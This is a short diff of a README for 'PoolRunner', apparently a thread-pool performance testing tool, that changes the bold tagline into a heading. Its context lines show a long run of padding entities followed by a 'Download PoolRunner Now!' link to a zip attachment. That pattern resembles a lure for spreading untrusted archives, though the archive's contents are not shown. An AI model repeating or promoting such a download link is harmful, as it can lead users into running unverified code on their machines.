@@ -3,7 +3,7 @@
 &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;
  <a href="https://github.com/user-attachments/files/18772054/PoolRunner.zip">Download PoolRunner Now!</a> 
  <hr>
-<b>A client-server based extensible performance testing simulation tool for Thread Pool System.</b>
+<h2>A client-server based extensible performance testing simulation tool for Thread Pool System.</h2>
 
 ![poolrunner](https://user-images.githubusercontent.com/108230246/189495284-322dff07-8973-4030-8215-039a9416504a.jpg)
 
